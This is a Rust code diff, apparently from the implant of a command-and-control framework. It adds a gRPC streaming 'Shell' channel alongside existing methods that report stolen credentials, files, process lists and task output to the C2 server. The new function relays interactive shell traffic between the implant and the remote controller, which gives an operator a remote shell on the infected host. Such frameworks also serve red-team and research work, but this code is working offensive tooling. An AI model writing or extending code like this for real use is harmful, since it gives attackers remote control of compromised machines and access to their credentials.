@@ -14,6 +14,7 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
+static SHELL_PATH: &str = "/c2.C2/Shell";
 
 #[derive(Debug, Clone)]
 pub struct GRPC {
@@ -113,6 +114,42 @@ impl Transport for GRPC {
     ) -> Result<ReportTaskOutputResponse> {
         let resp = self.report_task_output_impl(request).await?;
         Ok(resp.into_inner())
+    }
+
+    async fn shell(&mut self, rx: Receiver<ShellRequest>, tx: Sender<ShellResponse>) -> Result<()> {
+        let out_stream = tokio_stream::iter(rx);
+        let tonic_req = Request::new(out_stream);
+        let resp = self.shell_impl(tonic_req).await?;
+        let mut in_stream = resp.into_inner();
+        tokio::spawn(async move {
+            loop {
+                let msg = match in_stream.message().await {
+                    Ok(maybe_msg) => match maybe_msg {
+                        Some(msg) => msg,
+                        None => {
+                            break;
+                        }
+                    },
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("failed to receive shell data: {}", _err);
+
+                        return;
+                    }
+                };
+                match tx.send(msg) {
+                    Ok(_) => {}
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("failed to send shell data: {}", _err);
+
+                        return;
+                    }
+                }
+            }
+        });
+
+        Ok(())
     }
 }
 
@@ -258,5 +295,22 @@ impl GRPC {
         req.extensions_mut()
             .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
         self.grpc.unary(req, path, codec).await
+    }
+
+    async fn shell_impl(
+        &mut self,
+        request: impl tonic::IntoStreamingRequest<Message = ShellRequest>,
+    ) -> std::result::Result<tonic::Response<tonic::codec::Streaming<ShellResponse>>, tonic::Status>
+    {
+        self.grpc.ready().await.map_err(|e| {
+            tonic::Status::new(
+                tonic::Code::Unknown,
+                format!("Service was not ready: {}", e),
+            )
+        })?;
+        let codec: ProstCodec<ShellRequest, ShellResponse> = tonic::codec::ProstCodec::default();
+        let path = tonic::codegen::http::uri::PathAndQuery::from_static(SHELL_PATH);
+        let req = request.into_streaming_request();
+        self.grpc.streaming(req, path, codec).await
     }
 }
